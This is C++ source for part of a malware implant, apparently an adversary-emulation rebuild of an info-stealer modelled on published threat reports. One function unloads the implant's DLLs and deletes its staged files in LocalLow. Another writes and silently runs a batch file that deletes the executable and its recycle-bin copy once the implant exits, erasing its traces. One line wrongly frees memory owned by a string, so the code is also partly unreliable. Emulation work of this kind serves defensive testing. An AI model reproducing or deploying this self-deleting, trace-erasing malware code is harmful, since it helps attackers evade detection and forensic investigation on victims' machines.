#include "cleanup.h"

/**
* This function unloads all of the DLLs that were loaded and deletes
* any staged files (minimal number due to exfiltration in place) from the LocalLow
* folder location.
* 
* Sources:
* Sekoia - Bullet #12 under "In-depth Analysis"
*/
bool cleanup(unordered_map<wstring, HMODULE> handles) {
    int success = true;
    vector<wstring> files;
    vector<wstring> emptyVector;
    wstring stagingPath = g_localLowPath + g_stagingFolder;
    files = getPaths(stagingPath, emptyVector, emptyVector, 0, 1, FILES);

    // Unload DLLs first
    success = unloadDLLs(handles);

    // If any of the added DLLs (not Windows) fail, can't delete the folder
    // This just looks for any failure, so be advised the folder may exist
    if (!success) {
        return false;
    }

    // Delete all the files in the folder
    for (int i = 0; i < files.size(); i++) {
        if (!g_racDeleteFileW(files[i].c_str())) {
            success = false;
        }
    }

    // Delete the folder if the status doesn't show any lingering files
    if (success) {
        if (!g_racRemoveDirectoryW(wstring(g_localLowPath + g_stagingFolder).c_str())) {
            success = false;
        }
    }

    g_racReleaseMutex(g_hMutex);

    return success;
}


/**
* Last action by the implant prior to returning from main.
* 
* Gets the current path of the executable and the current user SID and plugs them 
* into a bat file that is written to disk directly in LocalLow.
*
* The bat file loops until this implant terminates, then deletes it
* from the origin as well as the user's recycle bin.
* 
* This functionality is not covered in intelligence, we made a guess on this one.
* 
* Sources:
* - Functionality inferred from CyberInt - Bullets under "In-depth Analysis"
*/
int initiateSelfDelete() {
    int res;
    wstring batPath = g_localLowPath + g_hastalavista;

    // Grab the path to the executable
    wchar_t exePath[MAX_PATH];
    g_racGetModuleFileNameW(0, exePath, MAX_PATH);

    // The current user's SID is needed for recycle bin
    wstring userSID = getUserSID();
    wstring recycleBin(g_recyclebin + userSID + g_exe);

    // Write the bat to disk
    res = writeToFile((g_batPartOne + wstring(exePath) + g_batPartTwo + wstring(exePath) + g_batPartThree + recycleBin + g_batPartFour), batPath);
    if (res == -1) {
        return res;
    }

    // Sleep to ensure the file exists, sometimes it's a little too fast
    Sleep(1000);
    
    // Call the bat
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    LPWSTR pBat = &batPath[0];

    res = g_racCreateProcessW(NULL, pBat, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    delete pBat;

    return res;
}